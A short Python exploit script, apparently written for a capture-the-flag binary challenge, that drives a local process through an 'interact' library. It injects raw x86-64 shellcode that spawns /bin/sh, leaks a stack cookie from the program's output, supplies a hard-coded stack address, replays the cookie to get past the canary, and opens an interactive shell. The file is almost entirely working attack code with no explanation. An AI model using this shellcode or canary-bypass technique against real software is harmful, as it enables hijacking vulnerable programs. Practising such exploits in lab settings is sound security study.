import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
print(p.readuntil('name?'))
shellcode = "\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\x54\x5F\x6A\x3B\x58\x31\xD2\x0F\x05"
p.sendline(shellcode)
print(p.readuntil('finish)'))
p.sendline('9')
print(p.readuntil('store]:'))
p.sendline('eat')
cookie_data = p.readline()
print(cookie_data)
cookie = cookie_data.split(' ')[-1]
print(cookie)
print(p.readuntil('finish)'))
p.sendline('11')
# print(p.readuntil('hex)!'))
# p.sendline(cookie)
print(p.readuntil('store]:'))
p.sendline('store')
print(p.readuntil('hex)!'))
p.sendline('7fffffffed40')
print(p.readuntil('finish)'))
p.sendline('-1')
print(p.readline())
print(p.readline())
p.sendline(cookie)
# data = p.readuntil('\n')
# p.sendline('hello')
p.interactive()
